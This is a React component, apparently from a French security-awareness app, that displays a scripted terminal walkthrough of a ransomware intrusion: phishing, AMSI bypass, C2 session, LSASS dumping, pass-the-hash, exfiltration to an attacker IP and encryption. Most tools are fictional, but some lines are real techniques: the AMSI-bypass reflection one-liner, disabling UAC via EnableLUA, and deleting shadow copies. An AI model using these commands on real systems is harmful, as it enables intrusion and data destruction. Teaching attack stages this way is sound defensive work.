import React, { useState } from 'react'
import { motion } from 'framer-motion'
import { Terminal, Shield, Check, AlertCircle, Play, Copy, RotateCcw, Cpu, Wifi, Globe } from 'lucide-react'
import { sound } from '../../utils/audio'

interface LinuxTerminalSimulatorProps {
  stageId: number
}

export default function LinuxTerminalSimulator({ stageId }: LinuxTerminalSimulatorProps) {
  const [activeTab, setActiveTab] = useState<number>(stageId)

  React.useEffect(() => {
    setActiveTab(stageId)
  }, [stageId])

  const scenarios = [
    {
      stage: 0,
      title: 'Armement & Spoofing SMTP',
      tool: 'GÉNÉRATEUR DE CHARGE & RELAIS SMTP SÉCURISÉ',
      badge: 'Vecteur Entrée',
      lines: [
        { type: 'prompt', text: 'root@sec-c2:~# payload-generator --payload windows/x64/c2_agent_https --lhost 185.22.14.89 --lport 443 -o payload_macro.vba' },
        { type: 'output', text: '[*] Génération de la macro VBA obfusquée pour document bureautique...' },
        { type: 'output', text: '[+] Charge utile générée : payload_macro.vba (512 octets)' },
        { type: 'prompt', text: 'root@sec-c2:~# mail-sender --to rh@entreprise.com --from "direction-rh@plateforme-paie.online" --attach Note_Salaires_2026.docm --server smtp.relay-cloud.org:587' },
        { type: 'success', text: '=== 250 2.0.0 OK Message accepté par la passerelle de messagerie' },
        { type: 'info', text: '[*] E-mail délivré sur le poste RH (Boîte de réception utilisateur)' },
      ],
    },
    {
      stage: 1,
      title: 'Exécution & Évasion Défensive',
      tool: 'INTERPRÉTEUR DE COMMANDES & BYPASS AMSI',
      badge: 'Évasion AMSI',
      lines: [
        { type: 'prompt', text: 'PS C:\\Users\\sophie> powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...' },
        { type: 'output', text: '[*] Décodage de la charge PowerShell en mémoire vive...' },
        { type: 'prompt', text: 'PS C:\\Users\\sophie> [Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true)' },
        { type: 'alert', text: '[!] AMSI (Antimalware Scan Interface) contourné avec succès en mémoire vive.' },
        { type: 'prompt', text: 'PS C:\\Users\\sophie> Set-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "EnableLUA" -Value 0' },
        { type: 'success', text: '[+] Journalisation de script et mécanismes de contrôle d\'accès contournés.' },
      ],
    },
    {
      stage: 2,
      title: 'Liaison C2 Reverse HTTPS',
      tool: 'INTERPRÉTEUR C2 / GESTIONNAIRE D\'ÉCOUTE HTTPS',
      badge: 'Liaison C2',
      lines: [
        { type: 'prompt', text: 'root@sec-c2:~# c2-handler --listen --proto https --port 443 --bind 185.22.14.89' },
        { type: 'output', text: '[*] Gestionnaire d\'écoute C2 actif sur https://185.22.14.89:443 (TLS 1.3)' },
        { type: 'output', text: '[*] Requête entrante reçue depuis 192.168.10.45:49812 (Poste RH)' },
        { type: 'success', text: '[+] Session C2 interactive #1 établie avec succès (185.22.14.89:443 <- 192.168.10.45)' },
        { type: 'prompt', text: 'c2-agent [1] > sysinfo' },
        { type: 'output', text: 'Hôte             : HOST-SOPHIE-01\nOS               : Windows 11 Enterprise (Build 22631)\nContexte Compte  : ENTREPRISE\\sophie.rh (Utilisateur Standard)\nProcessus Hôte   : explorer.exe (PID: 4892)' },
        { type: 'success', text: '[!] Contrôle interactif à distance validé.' },
      ],
    },
    {
      stage: 3,
      title: 'Extraction Mémoire LSASS',
      tool: 'MODULE D\'EXTRACTION MÉMOIRE VIVE',
      badge: 'Vol Identifiants',
      lines: [
        { type: 'prompt', text: 'c2-agent [1] > inject-mem-module --target lsass.exe --action dump-hashes' },
        { type: 'output', text: '[*] Ouverture du handle de processus local lsass.exe avec privilège SeDebugPrivilege...' },
        { type: 'output', text: '[*] Analyse des structures d\'authentification en mémoire vive...' },
        { type: 'output', text: 'Compte identifié : ENTREPRISE\\DA_admin (Administrateur du Domaine)' },
        { type: 'alert', text: '[!] HASH NTLM : 8846f7eaee8fb117ad06bdd830b7586c (Administrateur du Domaine)' },
        { type: 'info', text: '[*] Tickets Kerberos TGT collectés pour injection de session.' },
        { type: 'success', text: '[+] PRIVILÈGES ADMINISTRATEUR DU DOMAINE ACQUIS.' },
      ],
    },
    {
      stage: 4,
      title: 'Mouvement Latéral SMB & WMI',
      tool: 'OUTIL DE PROPAGATION SMB / RPC',
      badge: 'Rebond Latéral',
      lines: [
        { type: 'prompt', text: 'root@sec-c2:~# smb-spread 192.168.10.0/24 -u DA_admin -H 8846f7eaee8fb117ad06bdd830b7586c' },
        { type: 'output', text: 'SMB  192.168.10.10:445  DC-CORP-01   [*] Windows Server (Active Directory)' },
        { type: 'output', text: 'SMB  192.168.10.20:445  FS-CORP-01   [*] Windows Server (Serveur de Fichiers Central)' },
        { type: 'success', text: 'SMB  192.168.10.20:445  FS-CORP-01   [+] Accès Écriture & Contrôle Total validé' },
        { type: 'prompt', text: 'root@sec-c2:~# rpc-exec FS-CORP-01 -u DA_admin -H 8846f7eaee8fb117ad06bdd830b7586c "whoami"' },
        { type: 'success', text: '[*] Réponse : nt authority\\system (Contrôle total du serveur de fichiers)' },
      ],
    },
    {
      stage: 5,
      title: 'Exfiltration Furtive (Double Extorsion)',
      tool: 'MODULE D\'EXFILTRATION CHIFFRÉE',
      badge: 'Double Extorsion',
      lines: [
        { type: 'prompt', text: 'c2-agent [FS-CORP] > data-collector --paths "D:\\RH","D:\\Finances","D:\\Direction" --compress --encrypt aes256' },
        { type: 'output', text: '[*] Indexation des données sensibles : 14 250 documents d\'entreprise identifiés.' },
        { type: 'output', text: '[*] Création d\'une archive chiffrée compressée en morceaux de 50 Mo...' },
        { type: 'prompt', text: 'c2-agent [FS-CORP] > exfiltrate --archive "D:\\Temp\\sec_export.enc" --proto https-split --dest 185.22.14.89:443' },
        { type: 'info', text: '[*] Transfert furtif par segmentation HTTPS vers stockage cloud distant...' },
        { type: 'alert', text: '[!] 42 Go de données stratégiques (RH/Finances) exfiltrés avec succès.' },
        { type: 'success', text: '[+] Levier d\'extorsion confirmé avant déclenchement du chiffrement.' },
      ],
    },
    {
      stage: 6,
      title: 'Sabotage & Chiffrement Rançongiciel',
      tool: 'DÉTONATEUR RANÇONGICIEL & SABOTAGE VSS',
      badge: 'Chiffrement',
      lines: [
        { type: 'prompt', text: 'c2-agent [FS-CORP] > detonator --target "D:\\Partages" --ext .locked --kill-vss --stop-services' },
        { type: 'output', text: '[*] Suppression des clichés instantanés : vssadmin delete shadows /all /quiet' },
        { type: 'output', text: '[*] Arrêt des services applicatifs et de bases de données métiers...' },
        { type: 'output', text: '[*] Chiffrement massif des volumes par algorithme hybride AES-256 + RSA-4096...' },
        { type: 'alert', text: '[!] 4 829 fichiers chiffrés. Extension appliquée : *.locked' },
        { type: 'output', text: '[*] Dépôt de la note de rançon : D:\\Partages\\INSTRUCTIONS_RECUPERATION.txt' },
        { type: 'alert', text: '[$$$] Rançon exigée : Paiement sous 72 heures sous peine de divulgation publique.' },
      ],
    },
  ]

  const current = scenarios[activeTab] || scenarios[0]

  return (
    <div className="relative w-full rounded-[3px] border border-[#E2E4E9] bg-[#0d1117] shadow-tactile overflow-hidden font-mono text-xs select-none">
      {/* 1. PANNEAU SUPÉRIEUR OFFICIEL KALI LINUX (XFCE) */}
      <div className="bg-[#0b1016] px-3 py-1.5 border-b border-slate-800 flex items-center justify-between text-slate-300">
        <div className="flex items-center gap-3">
          {/* Dragon Kali Icon */}
          <div className="flex items-center gap-1.5 bg-[#1f293d] px-2 py-0.5 rounded border border-blue-500/30 text-blue-400 font-bold">
            <span className="text-sm">🐉</span>
            <span className="text-[11px] tracking-wide text-white">Kali Linux</span>
          </div>

          <div className="hidden sm:flex items-center gap-1 text-[11px] text-slate-400">
            <span className="px-2 py-0.5 rounded bg-slate-900 border border-slate-800 text-blue-400 font-bold">
              1
            </span>
            <span className="px-2 py-0.5 rounded hover:bg-slate-800">2</span>
            <span className="px-2 py-0.5 rounded hover:bg-slate-800">3</span>
            <span className="px-2 py-0.5 rounded hover:bg-slate-800">4</span>
          </div>
        </div>

        <div className="flex items-center gap-3 text-[11px] text-slate-400">
          <div className="flex items-center gap-1">
            <Globe size={13} className="text-blue-400" />
            <span className="font-mono text-slate-200">185.22.14.89 (Bulgarie)</span>
          </div>
          <span className="text-slate-600">|</span>
          <span className="text-red-400 font-bold">root@kali-c2</span>
        </div>
      </div>

      {/* 2. SÉLECTEUR D'ÉTAPES OFFENSIVES (ONGLETS TERMINAL) */}
      <div className="bg-slate-950 px-3 py-1.5 border-b border-slate-800/80 flex items-center gap-1 overflow-x-auto">
        {scenarios.map((sc, idx) => {
          const isSelected = activeTab === idx
          return (
            <button
              key={idx}
              onClick={() => {
                sound.playClick()
                setActiveTab(idx)
              }}
              className={`flex items-center gap-2 px-3 py-1 rounded-t-lg text-[11px] font-semibold transition border-t-2 ${
                isSelected
                  ? 'bg-[#0d1117] border-blue-500 text-white shadow'
                  : 'bg-slate-900/60 border-transparent text-slate-400 hover:text-slate-200 hover:bg-slate-850'
              }`}
            >
              <Terminal size={12} className={isSelected ? 'text-blue-400' : 'text-slate-500'} />
              <span>
                {idx + 1}. {sc.badge}
              </span>
            </button>
          )
        })}
      </div>

      {/* 3. BARRE DE TITRE TERMINAL QTERMINAL */}
      <div className="flex items-center justify-between bg-slate-900/90 px-4 py-2 border-b border-slate-800">
        <div className="flex items-center gap-2">
          <div className="flex gap-1.5">
            <span className="w-3 h-3 rounded-full bg-rose-500/90 inline-block"></span>
            <span className="w-3 h-3 rounded-full bg-amber-500/90 inline-block"></span>
            <span className="w-3 h-3 rounded-full bg-emerald-500/90 inline-block"></span>
          </div>
          <span className="text-slate-300 font-bold ml-2 text-xs flex items-center gap-1.5">
            <span className="text-red-400">root@kali-c2:~#</span> {current.tool}
          </span>
        </div>

        <div className="flex items-center gap-2">
          <button
            onClick={() => sound.playClick()}
            className="text-[10px] text-slate-400 hover:text-white flex items-center gap-1 px-2 py-0.5 rounded bg-slate-800 border border-slate-700"
          >
            <Copy size={11} />
            <span>Copier logs</span>
          </button>
        </div>
      </div>

      {/* 4. ZONE D'AFFICHAGE DU TERMINAL AVEC FOND KALI */}
      <div className="p-4 bg-[#0d1117] min-h-[340px] max-h-[420px] overflow-y-auto space-y-2 relative">
        {/* Dragon Kali en filigrane discret */}
        <div className="absolute right-4 bottom-4 text-slate-800/20 text-8xl pointer-events-none select-none">
          🐉
        </div>

        {current.lines.map((line, idx) => {
          if (line.type === 'prompt') {
            return (
              <div key={idx} className="flex items-start gap-1 font-mono text-[11px] pt-1">
                <span className="text-red-400 font-bold shrink-0">root@kali-c2:~#</span>
                <span className="text-slate-100 break-all font-semibold">
                  {line.text.replace('root@kali-c2:~# ', '').replace('meterpreter > ', '')}
                </span>
              </div>
            )
          }

          if (line.type === 'success') {
            return (
              <div key={idx} className="text-emerald-400 font-bold text-[11px] pl-3 py-0.5">
                {line.text}
              </div>
            )
          }

          if (line.type === 'alert') {
            return (
              <div
                key={idx}
                className="bg-red-950/40 border-l-2 border-red-500 text-red-300 font-bold text-[11px] px-2 py-1 my-1"
              >
                {line.text}
              </div>
            )
          }

          if (line.type === 'info') {
            return (
              <div key={idx} className="text-sky-300 text-[11px] pl-3 py-0.5">
                {line.text}
              </div>
            )
          }

          return (
            <div key={idx} className="text-slate-400 text-[11px] whitespace-pre-wrap pl-3">
              {line.text}
            </div>
          )
        })}

        {/* Curseur clignotant authentique */}
        <div className="flex items-center gap-1 text-slate-300 pt-2">
          <span className="text-red-400 font-bold">root@kali-c2:~#</span>
          <span className="inline-block w-2 h-4 bg-emerald-400 animate-pulse ml-1"></span>
        </div>
      </div>

      {/* 5. PIED DE PAGE EXPLICATIF RSSI */}
      <div className="bg-slate-950 px-4 py-2 border-t border-slate-800 flex items-center justify-between text-[11px] text-slate-400">
        <div className="flex items-center gap-2">
          <span className="w-2 h-2 rounded-full bg-emerald-500"></span>
          <span>Tunnel C2 Reverse HTTPS chiffré TLS 1.3 · Port 443</span>
        </div>
        <span className="text-amber-400 font-bold font-mono">
          Phase : {current.title}
        </span>
      </div>
    </div>
  )
}
